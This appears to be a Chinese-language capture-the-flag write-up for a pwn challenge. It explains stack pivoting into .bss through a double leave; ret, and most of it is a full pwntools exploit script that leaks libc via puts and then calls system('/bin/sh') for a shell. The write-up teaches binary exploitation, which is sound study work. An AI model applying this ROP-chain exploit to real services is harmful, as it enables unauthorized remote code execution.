# 栈的奇妙之旅

## 题目简述

程序的栈溢出空间不足以直接放下完整利用链，但可控制保存的 `rbp` 和返回地址。利用 `leave; ret` 的语义，把 `.bss` 当作伪造栈：第一轮泄漏 libc，第二轮调用 `system("/bin/sh")`。

## 解题过程

`leave` 等价于 `mov rsp, rbp; pop rbp`，随后 `ret` 再从新 `rsp` 取执行地址。题目还提供了一个跳过函数序言的 `main` 内部地址 `0x4011E5`，因此先把保存的 `rbp` 改成 `.bss`，返回该地址，让下一次读入落到 `.bss-0x80`。

第二个输入末尾布置新的保存 `rbp` 和 `leave; ret`。连续两次 `leave` 后，`rsp` 精确落到 `.bss-0x80` 开头的伪栈，执行 `puts(puts@GOT)` 并回到 `main`。泄漏后同样在另一块 `.bss` 区域布置第二条伪栈。

```python
from pwn import ELF, flat, p64, remote, u64

elf = ELF("./pwn")
libc = ELF("./libc.so.6", checksec=False)
io = remote("host", 10000)

leave_ret = 0x4011FC
pop_rdi = 0x4011C5
main_body = 0x4011E5
bss = 0x404200

# 让 rbp 指向 bss，并回到跳过序言的 main 主体。
io.sendafter(b"me?", b"A" * 0x80 + p64(bss) + p64(main_body))

# 该输入被写入 bss-0x80；末尾两项驱动双重 leave。
leak_stack = flat(
    bss + 0x600,          # 下一轮 main 使用的 rbp
    pop_rdi, elf.got["puts"],
    elf.plt["puts"],
    main_body,
)
leak_stack = leak_stack.ljust(0x80, b"\x00")
leak_stack += p64(bss - 0x80) + p64(leave_ret)
io.send(leak_stack)

io.recvuntil(b"\n")
puts = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = puts - libc.sym["puts"]

# main_body 以 rbp=bss+0x600 再读入，缓冲区位于 bss+0x580。
shell_stack = flat(
    bss,
    pop_rdi, next(libc.search(b"/bin/sh\x00")),
    pop_rdi + 1,          # 单独 ret，修正 system 前的栈对齐
    libc.sym["system"],
)
shell_stack = shell_stack.ljust(0x80, b"\x00")
shell_stack += p64(bss + 0x600 - 0x80) + p64(leave_ret)
io.send(shell_stack)
io.interactive()
```

## 方法总结

栈不必位于内核标记的传统栈区；只要内存可读写，且 `rsp` 被迁移过去，就能承载 ROP 链。分析 `leave; ret` 时应逐条记录 `rbp`、`rsp` 和每个伪栈首元素的用途，否则双重迁移很容易差八字节。
